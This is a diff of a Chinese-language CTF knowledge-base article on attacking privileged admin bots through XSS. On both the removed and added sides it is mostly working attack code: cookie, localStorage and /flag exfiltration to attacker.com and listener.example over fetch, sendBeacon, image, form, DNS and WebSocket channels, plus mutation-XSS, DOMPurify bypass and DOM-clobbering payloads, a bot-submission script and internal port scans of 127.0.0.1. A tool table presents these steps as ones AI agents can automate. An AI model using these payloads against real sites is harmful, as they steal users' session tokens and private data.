@@ -3,254 +3,204 @@ id: "ctf-website/07-client/admin-bot-xss"
 title: "Admin Bot / XSS 实战"
 title_en: "Admin Bot / XSS Practical Guide"
 summary: >
-  CTF admin bot场景下XSS攻击完整指南，涵盖六种外带通道（fetch、Image beacon、Form submit、window.location、DNS、WebSocket）、CSP绕过速查、DOM Clobbering变量劫持、SVG/MathML沙箱逃逸、Sanitizer绕过探测，以及通过admin bot扫描内网和2024+浏览器解析器差异攻击。
+  Admin Bot 题面的核心是让带高权限状态的浏览器访问可控页面，再按 CSP、cookie 属性、前端存储、同源 API、内网页面和 bot 行为差异选择外带或同源读取路线。本篇给出入口判定矩阵、外带通道选择器、bot 提交脚本、CSP gadget 选择、内网端口探测和 Evidence 模板。
 summary_en: >
-  Complete XSS attack guide for CTF admin bot scenarios, covering six exfiltration channels (fetch, Image beacon, Form submit, window.location, DNS, WebSocket), CSP bypass reference, DOM Clobbering variable hijacking, SVG/MathML sandbox escape, sanitizer bypass probes, internal network scanning via admin bot, and 2024+ browser parser differential attacks.
+  Admin Bot challenges require driving a privileged browser to a controlled page and choosing exfiltration or same-origin read paths according to CSP, cookie attributes, frontend storage, same-origin APIs, internal pages, and bot behavior. Includes routing matrices, channel selectors, submission scripts, CSP gadget choices, internal probing, and evidence templates.
 board: "ctf-website"
 category: "07-client"
-signals: ["XSS", "admin bot", "CSP bypass", "DOM clobbering", "跨站脚本", "exfiltration", "sanitizer bypass"]
-mcp_tools: ["http_probe", "kb_router"]
+signals: ["XSS", "admin bot", "CSP bypass", "DOM clobbering", "跨站脚本", "exfiltration", "sanitizer bypass", "headless chrome"]
+mcp_tools: ["http_probe", "kb_router", "jshook"]
 keywords: ["XSS", "admin bot", "CSP绕过", "DOM Clobbering", "Sanitizer绕过", "Cookie窃取", "外带通道", "SVG XSS", "parser differential"]
-difficulty: "intermediate"
-tags: ["xss", "client-side", "csp", "web-security", "ctf"]
+difficulty: "advanced"
+tags: ["xss", "client-side", "csp", "ctf", "browser"]
 language: "zh-CN"
-last_updated: "2026-06-25"
-related_articles: []
+last_updated: "2026-07-04"
+related_articles: ["ctf-website/07-client/js-runtime", "ctf-website/07-client/postmessage", "ctf-website/02-auth/jwt/07-theft-replay"]
 ---
 # Admin Bot / XSS 实战
 
-## 核心模型
+Admin Bot 本质是一个带高权限状态的浏览器。`alert(1)` 只是入口，真正的目标是拿到 bot 才能访问的同源数据、前端状态、token、内部面板或 flag。
 
-CTF admin bot 本质：**一个 headless 浏览器，带着高权限 cookie/localStorage 访问你提供的 URL**。目标不是 `alert(1)`，而是通过允许的渠道把 flag/sensitive data 外带出来。
+## 输入信号
 
-## 外带通道
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| 有 `/report`、`/submit`、`/visit` 让 bot 访问 URL | 枚举提交参数、等待时间、可访问协议 | bot 访问 listener，带 HeadlessChrome UA | 只做服务端 URL 抓取，不执行 JS |
+| 反射/存储 HTML 注入 | 先测 parser 与 sanitizer，再测外带通道 | payload 在 bot 环境触发 listener | 用户浏览器触发，bot 不触发 |
+| Cookie 为 HttpOnly | 走同源 fetch 读 `/flag`、`/api/me`、`/admin` | fetch 响应可外带 | CORS/Origin/CSRF 阻断同源状态 |
+| token 在 localStorage/sessionStorage | 注入运行时快照 | JWT/access_token 可重放 | token 只用于 UI，API 依赖 cookie |
+| CSP 存在 | 按 `connect-src/img-src/form-action/script-src` 路由 | 至少一个外带通道被允许 | 所有外链被拦，转 same-origin sink |
+| bot 可能有内网视角 | 端口/路径时间差探测 | 127.0.0.1 或内网服务响应差异 | bot 网络与公网一致 |
 
-```javascript
-// 按 CSP 适配选择外带方式:
-// 优先级: fetch > image > form > window.location > DNS
+## 工作流
 
-// 通道 1: fetch (需 connect-src 允许目标域或 *)
-fetch('https://attacker.com/s?' + document.cookie)
-fetch('https://webhook.site/YOUR-UUID?s=' + btoa(document.cookie))
-
-// 通道 2: Image beacon (img-src 允许)
-new Image().src = 'https://attacker.com/x?' + document.cookie
-
-// 通道 3: Form submit (form-action 允许)
-var f = document.createElement('form'); f.method='POST';
-f.action = 'https://attacker.com/collect';
-var i = document.createElement('input'); i.name='d'; i.value=document.cookie;
-f.appendChild(i); document.body.appendChild(f); f.submit();
-
-// 通道 4: window.location (无限制 — 但会跳走)
-window.location = 'https://attacker.com/' + document.cookie
-
-// 通道 5: DNS (最可靠, 绕过几乎所有 CSP)
-new Image().src = 'https://' + btoa(document.cookie).slice(0,60) + '.attacker.com/x'
-
-// 通道 6: WebSocket (connect-src ws:)
-var ws = new WebSocket('wss://attacker.com/leak');
-ws.onopen = function() { ws.send(document.cookie); };
+```text
+确认 bot 会执行 JS
+  → 读取 CSP/cookie/storage/API baseline
+  → 选择外带通道或同源读取
+  → 构造最短 payload
+  → 提交给 bot 并等待 listener
+  → 按响应推进 JWT、CSRF、内网或 postMessage 链
 ```
 
-## CSP 绕过速查
+## 0. 判定矩阵
 
-```javascript
-// 给定 CSP 头，选择对应的绕过 payload:
+| 约束 | 首选路线 | 备选路线 |
+|---|---|---|
+| `connect-src` 允许外域 | `fetch/sendBeacon/WebSocket` | image/form |
+| 只允许 `img-src` | image beacon、DNS label | 同源缓存写入后读 |
+| 只允许 `form-action` | 隐藏表单 POST | `window.name` 中转 |
+| `script-src` 禁 inline | SVG/MathML/gadget/DOM clobbering | 存储型页面二跳 |
+| Cookie HttpOnly | 同源 API 读取后外带响应 | CSRF 动作 + 状态差分 |
+| 无外带域 | same-origin 写入可读位置 | 把 flag 放入 profile/comment/log 再读 |
 
-// script-src 'none' / no 'unsafe-inline'
-// → 需要 script gadget 或 DOM clobbering
-// (无通用绕过，需针对目标库找 gadget)
-
-// script-src 'self' 'unsafe-inline'
-// → 直接注入 <script>alert(1)</script>
-
-// object-src 'none'
-// → 不能用 <object>/<embed>/<applet>
-
-// img-src * → Image beacon 外带
-// connect-src * → fetch/WS 外带
-// form-action * → form submit 外带
-
-// default-src 'none' + specific allows
-// → DNS exfil via <img> or <link> 一般是最后手段
-```
-
-## DOM Clobbering
-
-```javascript
-// 当 script 不可控但 HTML 注入存在时：
-// 通过 HTML 注入创建假元素，影响 JS 中全局变量的值
-
-// 目标 JS: if (window.config.debug) { ... }
-// 注入:
-// <a id="config" name="debug" href="x">
-
-// 目标 JS: if (document.getElementById('isAdmin').value === 'true')
-// 注入:
-// <input id="isAdmin" value="true">
-
-// 通用探测:
-var clobbered = ['config', 'debug', 'isAdmin', 'isPremium', 'role', 'perm']
-for (var k of clobbered) {
-    if (typeof window[k] !== 'undefined') { /* 可 clobber */ }
-}
-```
-
-## SVG/MathML 逃逸沙箱
-
-```xml
-<!-- 如果 HTML 标签被过滤，尝试 SVG namespace -->
-<svg xmlns="http://www.w3.org/2000/svg">
-  <script>/* 可能绕过仅匹配 HTML namespace 的过滤器 */</script>
-  <animate onbegin="fetch('https://attacker.com/'+document.cookie)" attributeName="x" dur="1s"/>
-  <set onbegin="fetch('https://attacker.com/'+document.cookie)" attributeName="x" to="1"/>
-</svg>
-
-<!-- MathML 类似 -->
-<math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch('https://attacker.com/'+document.cookie)>-->
-```
-
-## Sanitizer 绕过
-
-```javascript
-// DOMPurify 绕过探测 (version specific)
-// payload 模板库:
-
-// Mutation XSS (innerHTML → namespace confusion)
-"<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>"
-
-// 嵌套 template 绕过
-"<template><slot name=x><img src=x onerror=alert(1)></slot></template>"
-
-// 利用原型链
-"<a id=x><table><a id=x>"
-
-// 利用 CDATA 边界
-"<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></svg>"
-
-// 如果 sanitizer 版本可识别 → 查已知 CVE
-```
-
-## Admin Bot 交互脚本
+## 1. Bot 提交器
 
 ```python
-# bot_interact.py — 与 admin bot 交互的请求模板
+#!/usr/bin/env python3
+import argparse
+import json
 import requests
 
-BOT_SUBMIT_URL = "https://target.com/report"  # 提交 URL 让 bot 访问
+def submit(url, target, mode):
+    if mode == "json":
+        return requests.post(url, json={"url": target}, timeout=10)
+    if mode == "graphql":
+        return requests.post(url, json={"query": f'mutation{{visit(url:"{target}"){{ok}}}}'}, timeout=10)
+    return requests.post(url, data={"url": target}, timeout=10)
 
-def send_to_bot(url: str) -> dict:
-    """提交 URL 给 admin bot 访问"""
-    # 典型格式 1: form POST
-    r = requests.post(BOT_SUBMIT_URL, data={"url": url})
-    # 典型格式 2: JSON
-    # r = requests.post(BOT_SUBMIT_URL, json={"url": url})
-    # 典型格式 3: GraphQL
-    # r = requests.post(BOT_SUBMIT_URL, json={
-    #     "query": 'mutation { visitUrl(url: "' + url + '") { success } }'
-    # })
-    return {"status": r.status_code, "body": r.text}
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--submit-url", required=True)
+    ap.add_argument("--target-url", required=True)
+    ap.add_argument("--mode", choices=["form", "json", "graphql"], default="form")
+    args = ap.parse_args()
+    r = submit(args.submit_url, args.target_url, args.mode)
+    print(json.dumps({"status": r.status_code, "location": r.headers.get("Location", ""), "body": r.text[:500]}, ensure_ascii=False))
 
-def build_exploit_url(payload_js: str, callback_url: str) -> str:
-    """构造包含 XSS payload 的 URL"""
-    # 方式 1: 反射型 XSS
-    return f"https://target.com/search?q=<img src=x onerror='{payload_js}'>"
-
-    # 方式 2: 存储型 XSS (payload 已存在页面上)
-    # return f"https://target.com/profile/attacker"
-
-    # 方式 3: 直接可控页面
-    # return f"https://attacker.com/exploit.html"
+if __name__ == "__main__":
+    main()
 ```
 
-## 通过 admin bot 打内网
+成功样本：提交后 listener 收到 bot 访问，或目标队列返回 visit id。失败样本：只返回 URL syntax error、协议被过滤、队列存在但 listener 没有访问。
+
+## 2. 外带通道选择器
 
 ```javascript
-// admin bot 可能运行在内网环境
-// XSS payload 扫描内网:
-async function scan_internal() {
-    let results = [];
-    for (let port of [80, 443, 8080, 8443, 3000, 5000, 6379, 9200]) {
-        try {
-            let r = await fetch(`http://127.0.0.1:${port}/`, {mode:'no-cors'});
-            results.push(`port ${port}: open`);
-        } catch(e) {}
+(() => {
+  const L = "https://listener.example/collect";
+  const pack = async () => {
+    let same = "";
+    try {
+      same = await fetch("/flag", {credentials: "include"}).then(r => r.text());
+    } catch (e) {
+      same = String(e);
     }
-    fetch('https://attacker.com/r?' + JSON.stringify(results));
-}
+    return btoa(unescape(encodeURIComponent(JSON.stringify({
+      href: location.href,
+      cookie: document.cookie,
+      local: {...localStorage},
+      session: {...sessionStorage},
+      same: same.slice(0, 1200)
+    }))).replace(/=+$/, "");
+  };
+  pack().then(d => {
+    navigator.sendBeacon && navigator.sendBeacon(L, d);
+    fetch(L + "?f=" + d, {mode: "no-cors"}).catch(() => {});
+    (new Image()).src = L + "/i/" + d.slice(0, 1800);
+    const f = document.createElement("form");
+    f.method = "POST"; f.action = L; f.target = "_self";
+    const i = document.createElement("input"); i.name = "d"; i.value = d;
+    f.appendChild(i); document.body.appendChild(f);
+    setTimeout(() => f.submit(), 50);
+  });
+})();
 ```
+
+判定：
+
+| listener 现象 | 解释 |
+|---|---|
+| fetch/sendBeacon 到达 | `connect-src` 可用，继续读同源 API |
+| 只有 image 到达 | `img-src` 可用，分片外带 |
+| 只有 form 到达 | `form-action` 可用，用 POST 带长响应 |
+| 都不到达 | CSP/网络阻断，转同源写入或 DNS label |
+
+## 3. CSP 与 gadget 选择
+
+| CSP 形态 | Payload 族 |
+|---|---|
+| `script-src 'unsafe-inline'` | 直接 `<script>` 或事件处理器 |
+| `script-src 'self'` | 找同源 JSONP、Angular/React/Vue gadget、上传 JS |
+| `img-src *` | image beacon 外带 |
+| `connect-src *` | fetch/WebSocket 外带 |
+| `base-uri` 缺失 | `<base href>` 改相对资源加载 |
+| `trusted-types` 存在 | 找已有 policy 或 DOM sink 二跳 |
+
+```html
+<svg><animate attributeName="x" onbegin="fetch('/flag',{credentials:'include'}).then(r=>r.text()).then(t=>location='https://listener.example/?d='+btoa(t))"></animate></svg>
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror="fetch('/flag').then(r=>r.text()).then(t=>new Image().src='https://listener.example/i?d='+btoa(t))">-->
+```
+
+## 4. DOM Clobbering 与同源动作
+
+当脚本不可直接执行但 HTML 可注入时，优先影响目标代码已经读取的全局变量、form、anchor、config。
+
+```html
+<form id=config><input name=isAdmin value=true><input name=apiBase value=/admin></form>
+<a id=redirect_uri href="javascript:fetch('/flag').then(r=>r.text()).then(t=>location='https://listener.example/?d='+btoa(t))"></a>
+<iframe name=csrf_token srcdoc="<input id=x value=owned>"></iframe>
+```
+
+## 5. 内网与同源探测
+
+```javascript
+async function probe() {
+  const ports = [80, 443, 3000, 5000, 6379, 8000, 8080, 9222];
+  const out = [];
+  for (const p of ports) {
+    const t0 = performance.now();
+    try {
+      await fetch(`http://127.0.0.1:${p}/`, {mode: "no-cors", cache: "no-store"});
+      out.push({port: p, dt: Math.round(performance.now() - t0), hit: true});
+    } catch (e) {
+      out.push({port: p, dt: Math.round(performance.now() - t0), hit: false});
+    }
+  }
+  new Image().src = "https://listener.example/p?" + btoa(JSON.stringify(out));
+}
+probe();
+```
+
+成功样本：端口时间差稳定、同源 API 响应被外带、flag/token 到达 listener。失败样本：listener 无访问、只有普通用户访问、bot 不执行脚本、同源 fetch body 为空。
 
 ## 攻击链
 
-```
-XSS → cookie 窃取 → Session hijack → Account Takeover
-XSS → CSRF token 读取 → 完整 CSRF → 改密码/转账
-XSS → localStorage → JWT/Access Token 窃取 → API 滥用
-XSS → admin bot → 内网扫描 → SSRF → 内网 RCE
-XSS → DOM Clobbering → 修改 config.isAdmin → 前端鉴权绕过
-XSS → CSP bypass via image → 外带 flag
-XSS → SVG → CSP script-src bypass (某些浏览器) → 任意 JS 执行
-XSS → Sanitizer bypass → Mutation XSS → 持久化存储 → 所有用户感染
-XSS → WebSocket → 注入消息 → 服务端命令执行
-XSS → Service Worker → 持久化中间人 → 全站劫持
-
-## Browser Parser Differentials (2024+)
-
-### Streamed vs Non-Streamed HTML
-
-```html
-<!-- Chrome 流式解析 vs data: URI 一次性解析 → 不同的 DOM 树 -->
-<!-- ISO-2022-JP charset 切换使 CSP meta 标签只在一种模式下可见 -->
-
-<meta http-equiv="Content-Type" content="text/html; charset=iso-2022-jp">
-<script>
-  // 流式模式下: 浏览器已解析并应用了 CSP meta
-  // data: 模式下: CSP meta 还未出现 → 可执行 inline script
-</script>
+```text
+XSS 注入
+  → bot 执行 JS
+  → 读取同源 /flag 或前端 token
+  → 选择可用外带通道
+  → listener 收到响应
+  → JWT 重放 / CSRF 动作 / 内网探测 / postMessage 二跳
 ```
 
-### qs vs URLSearchParams Parser Differential
+## Evidence
 
-```javascript
-// Node.js qs: ]= 是键值分隔符 (优先级高于 =)
-// 浏览器 URLSearchParams: ]= 只是普通字符
-// → URL: ?a]=x&a=y 在服务器上 → a=["x","y"]，浏览器认为是 a]="x", a="y"
-
-// XSS via parser differential:
-// Server sees: redirect_uri=https://safe.com
-// Browser sees redirect_uri]=https: → safe.com 变成 key
-```
-
-## Sanitizer 绕过 (DOMPurify 2024+)
-
-```html
-<!-- Mutation XSS — 过滤后 DOM 和渲染后 DOM 不同 -->
-<math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch('/flag').then(r=>r.text()).then(t=>location='//attacker.com/'+btoa(t))>-->
-
-<!-- Namespace confusion — SVG 内的 HTML 被不同解析 -->
-<svg><foreignObject><div id="x"></div></foreignObject></svg>
-```
-
-### 自动化 Sanitizer Fuzz
-
-```python
-# Dom-Explorer — 系统化发现 parser 差异
-# npm install dom-explorer
-# 比较: sanitizer 输出的 DOM vs 浏览器渲染的 DOM
-# 找到两者不一致 → 潜在 mutation XSS
-```
-```
-
-## 证据
-
-记录: 注入点、完整 payload、CSP 头、sanitizer 版本、bot 类型(headless chrome/puppeteer/playwright)、外带通道、接收到的数据。
+| 项 | 记录内容 |
+|---|---|
+| bot 触发 | 提交 URL、队列响应、listener 时间、UA、IP、Referer |
+| 注入点 | URL、参数、payload、渲染上下文、sanitizer 输出 |
+| CSP 路由 | CSP header/meta、可用外带通道、失败通道 |
+| 同源读取 | 被读取路径、状态码、响应 hash、关键字段 |
+| 成功样本 | flag/token/admin 数据到达 listener，或同源动作产生状态变化 |
+| 失败样本 | CSP 拦截、bot 不执行 JS、cookie 不随请求、响应 hash 固定拒绝 |
+| 下一跳 | token 转 JWT 07；postMessage 转本目录 postmessage；内网转 SSRF/infra |
 
 ## MCP 工具映射
 
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| XSS 入口探测 | `http_probe` | HTTP GET 探测 XSS 注入点 |
-| 知识检索 | `kb_router` | 按 XSS 攻击信号搜索知识库 |
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| 入口探测 | `http_probe` | 探测注入点、CSP、bot 提交接口 |
+| 浏览器打点 | `jshook` | 注入 fetch/XHR/storage hook |
+| 知识路由 | `kb_router` | 按 XSS、CSP、admin bot、DOM clobbering 信号搜索 |
